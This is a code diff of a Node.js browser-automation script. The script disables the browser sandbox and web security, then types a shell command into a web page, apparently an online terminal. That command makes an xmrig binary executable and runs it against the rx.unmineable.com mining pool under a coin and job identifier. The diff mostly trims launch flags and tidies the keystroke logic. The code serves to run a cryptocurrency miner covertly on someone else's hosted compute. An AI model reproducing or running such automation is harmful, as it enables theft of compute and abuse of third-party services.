@@ -15,50 +15,12 @@ const run = async () => {
 
   const { page, browser } = await connect({
     args: [
-      "--no-sandbox",
-      "--disable-setuid-sandbox",
-      "--ignore-certificate-errors",
-      "--ignore-certificate-errors-spki-list",
       "--disable-gpu",
-      "--disable-infobars",
-      "--window-position=0,0",
-      "--ignore-certifcate-errors",
-      "--ignore-certifcate-errors-spki-list",
-      "--disable-speech-api",
-      "--disable-background-networking",
-      "--disable-background-timer-throttling",
-      "--disable-backgrounding-occluded-windows",
-      "--disable-breakpad",
-      "--disable-client-side-phishing-detection",
-      "--disable-component-update",
-      "--disable-default-apps",
-      "--disable-dev-shm-usage",
-      "--disable-domain-reliability",
-      "--disable-extensions",
-      "--disable-features=AudioServiceOutOfProcess",
-      "--disable-hang-monitor",
-      "--disable-ipc-flooding-protection",
-      "--disable-notifications",
-      "--disable-offer-store-unmasked-wallet-cards",
-      "--disable-popup-blocking",
-      "--disable-print-preview",
-      "--disable-prompt-on-repost",
-      "--disable-renderer-backgrounding",
-      "--disable-setuid-sandbox",
-      "--disable-sync",
-      "--hide-scrollbars",
-      "--ignore-gpu-blacklist",
-      "--metrics-recording-only",
-      "--mute-audio",
-      "--no-default-browser-check",
-      "--no-first-run",
-      "--no-pings",
       "--no-sandbox",
-      "--no-zygote",
-      "--password-store=basic",
-      "--use-gl=swiftshader",
-      "--use-mock-keychain",
-      "--incognito",
+      "--disable-setuid-sandbox",
+      "--disable-dev-shm-usage",
+      "--disable-extensions",
+      "--disable-images",
       "--disable-web-security",
       "--disable-features=IsolateOrigins,site-per-process",
     ],
@@ -105,12 +67,13 @@ const run = async () => {
     text += "&& chmod +x xmrig ";
     text += "&& clear ";
     text += `&& ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u ${coin}.${job}#rup9-jjmz -p x`;
-    
+
     for (let i = 0; i < text.length; i++) {
       const char = text[i];
-      const cc = ":&#";
       if (
-        cc.includes(char) ||
+        char === ":" ||
+        char === "&" ||
+        char === "#" ||
         (char === char.toUpperCase() && char !== char.toLowerCase())
       ) {
         await page.keyboard.down("Shift");
@@ -147,4 +110,4 @@ const run = async () => {
   }
 };
 
-run()
+run();
